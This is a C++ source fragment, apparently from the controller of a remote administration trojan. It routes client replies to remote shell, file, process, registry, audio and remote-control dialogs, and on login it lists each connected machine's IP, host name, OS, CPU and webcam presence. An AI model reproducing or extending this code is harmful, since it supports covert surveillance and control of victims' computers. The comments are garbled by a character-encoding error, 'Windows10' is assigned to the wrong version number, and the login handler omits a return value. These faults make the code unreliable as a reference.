void  CALLBACK  CServerDlg::WindowNotifyProcedure(PCONTEXT_OBJECT  ContextObject)
{
	WindowHandleIO(ContextObject);
}
void  CServerDlg::WindowHandleIO(CONTEXT_OBJECT*  ContextObject)
{
	if (ContextObject == NULL)
	{
		return;
	}
	if (ContextObject->DialogID > 0)
	{
		switch (ContextObject->DialogID)
		{
		case  CMD_MANAGER_DIALOG:
		{
			CDlgCmdManager*  Dialog = (CDlgCmdManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case PROCESS_MANAGER_DIALOG:
		{
			CDlgProcessManager*  Dialog = (CDlgProcessManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case WINDOW_MANAGER_DIALOG:
		{
			CDlgWindowManager*  Dialog = (CDlgWindowManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  REMOTE_CONTROL_DIALOG:
		{
			CDlgRemoteControl*  Dialog = (CDlgRemoteControl*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  FILE_MANAGER_DIALOG:
		{
			CDlgFileManager*  Dialog = (CDlgFileManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  AUDIO_MANAGER_DIALOG:
		{
			CDlgAudioManager*  Dialog = (CDlgAudioManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  SERVICE_MANAGER_DIALOG:
		{
			CDlgServiceManager*  Dialog = (CDlgServiceManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  REGISTER_MANAGER_DIALOG:
		{
			CDlgRegisterManager*  Dialog = (CDlgRegisterManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		}
		return;
	}
	switch (ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])
	{
	case  CLIENT_LOGIN:    //�û���¼����
	{
		//ʹ���Զ����¼��Ϣ
		__ServerDlg->PostMessageA(UM_CLIENT_LOGIN, NULL, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_GET_OUT_REPLY:
	{
		//�����ڵ�ǰ�����ϵ��첽����
		CancelIo((HANDLE)ContextObject->ClientSocket);
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = NULL;
		Sleep(10);
		break;
	}
	case  CLIENT_REMOTE_MESSAGE_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REMOTE_MESSAGE_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_PROCESS_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_PROCESS_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_CMD_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_CMD_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_WINDOW_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_WINDOW_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_REMOTE_CONTROL_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REMOTE_CONTROL_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_FILE_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_FILE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_AUDIO_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_AUDIO_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_SERVICE_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_SERVICE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_REGISTER_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REGISTER_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	}
}
//�û���������
LRESULT CServerDlg::OnClientLogin(WPARAM wParam, LPARAM lParam)
{
	CString  ClientAddress, HostName, ProcessorNameString, IsWebCameraExist,
		WebSpeed, OSName;
	CONTEXT_OBJECT*  ContextObject = (CONTEXT_OBJECT*)lParam;
	if (ContextObject == NULL)
	{
		return -1;
	}
	CString  v1;
	try
	{
		int  v20 = ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength();
		int  v21 = sizeof(LOGIN_INFORMATION);
		if (v20 != sizeof(LOGIN_INFORMATION))
		{
			return -1;
		}
		LOGIN_INFORMATION*  LoginInfo =
			(PLOGIN_INFORMATION)ContextObject->m_ReceivedDecompressedBufferData.GetArray();
		//��ÿͻ���IP��ַ
		sockaddr_in  v2;
		memset(&v2, 0, sizeof(v2));
		int  v3 = sizeof(sockaddr_in);
		getpeername(ContextObject->ClientSocket, (SOCKADDR*)&v2, &v3);
		ClientAddress = inet_ntoa(v2.sin_addr);

		//��������
		HostName = LoginInfo->HostName;

		//����ϵͳ
		switch (LoginInfo->OsVersionInfoEx.dwPlatformId)
		{
		case  VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion <= 4)
			{
				OSName = "WindowsNT";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5&& LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OSName = "Windows2000";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OSName = "WindowsXP";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OSName = "Windows2003";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OSName = "WindowsVista";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OSName = "Windows7";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OSName = "Windows10";
			}
		}
		//CPU
		ProcessorNameString = LoginInfo->ProcessorNameString;
		//����
		WebSpeed.Format("%d", LoginInfo->WebSpeed);
		//����ͷ
		IsWebCameraExist = LoginInfo->IsWebCameraExist ? "��" : "��";

		//��ؼ��������
		AddCtrlListServerOnline(ClientAddress, HostName, OSName, ProcessorNameString, IsWebCameraExist,
				WebSpeed, ContextObject);
		//ContextObject �Ƿ��ڿؼ��е���������
	}
	catch (...) {}
}
void  CServerDlg::AddCtrlListServerOnline(CString ClientAddress, CString  HostName,
	CString  OSName, CString  ProcessorNameString, CString IsWebCameraExist,
	CString  WebSpeed, CONTEXT_OBJECT* ContextObject)
{
	int i = m_CListCtrl_Server_Dialog_Online.InsertItem(m_CListCtrl_Server_Dialog_Online.GetItemCount(), ClientAddress);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 1, HostName);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 2, OSName);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 3, ProcessorNameString);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 4, IsWebCameraExist);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 5, WebSpeed);

	m_CListCtrl_Server_Dialog_Online.SetItemData(i, (ULONG_PTR)ContextObject);   //���뵽���ŵ�������
	ShowDialogMessage(TRUE, ClientAddress + "��������");
}
void CServerDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	char  TimeData[MAX_PATH] = { 0 };
	auto  TimeObject = time(NULL);
	tm   v1;
	localtime_s(&v1, &TimeObject);
	strftime(TimeData, _countof(TimeData), "%Y-%m-%d %H:%M:%S", &v1);
	CString  v2;
	v2.Format("%s", TimeData);
	CString   Title = "Server  ";
	v2 = Title + v2;
	SetWindowTextA(v2);
	CDialogEx::OnTimer(nIDEvent);
}
